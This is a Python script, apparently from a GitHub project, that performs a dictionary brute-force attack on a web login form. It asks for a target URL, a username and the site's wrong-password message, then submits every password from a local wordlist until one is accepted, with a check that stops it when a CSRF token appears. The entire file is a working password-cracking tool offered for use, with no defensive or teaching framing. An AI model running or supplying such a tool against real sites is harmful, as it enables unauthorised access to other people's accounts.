######################################################################################################
# Title: Brute force                                                                                 #
# Author: Tanvir Hossain Antu                                                                        #
# Github : https://github.com/Antu7                                                                  #
######################################################################################################

print (""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            
                                                                            
                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce


""")

z = """     



                       Checking the Server !!
        
        [+]█████████████████████████████████████████████████[+]



"""


import requests
import time
import sys

url = input("Enter Target Url: ")
username = input("Enter Target Username: ")
error = input("Enter Wrong Password Error Message: ")
print("\tExample of a structure:")
print("\t\theader1=^L^;header2=^P^;header3=content")
print("\twhere ^L^ will be login and ^P^ will be password.")
print("\tRemember to separate them with ';'")
data_dict = input("Enter data structure: ")
if data_dict.count("^L^") == 0 or data_dict.count("^P^") == 0:
    print("Given structure is wrong!")
    exit()
data_dict = data_dict.split(";")
data = {}

for element in data_dict:
    if "=" in element:
        in_element = element.split("=")
        if in_element[1] == "^L^":
            data[in_element[0]] = username
        elif in_element[1] == "^P^":
            passw_index = in_element[0]
            data[in_element[0]] = in_element[1]
        else:
            data[in_element[0]] = in_element[1]
    else:
        print("Given structure is wrong!")
        exit()

for c in z:
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(0.02)

try: 
    def bruteCracking(username,url,error):
        amount = len(passwords)
        for count, password in enumerate(passwords):
            print(f"{str(round(count/amount*100, 2)).zfill(5)}% Trying Password: {str(count+1)} Time For => {password}")
            data[passw_index] = password
            response = requests.post(url, data=data)
            if error in str(response.content):
                pass
            elif str(response.content).lower().count("csrf"):
                print("CSRF Token Detected!! BruteF0rce Not Working This Website.")
                exit()
            else:
                print("Username: ---> " + username)
                print("Password: ---> " + password)
                exit()
except:
    print("Some Error Occurred Please Check Your Internet Connection !!")

passwords = []
with open("passwords.txt", "r") as f:
    for password in f.readlines():
        passwords.append(password.strip())

bruteCracking(username,url,error)

print("[!!] password not in list")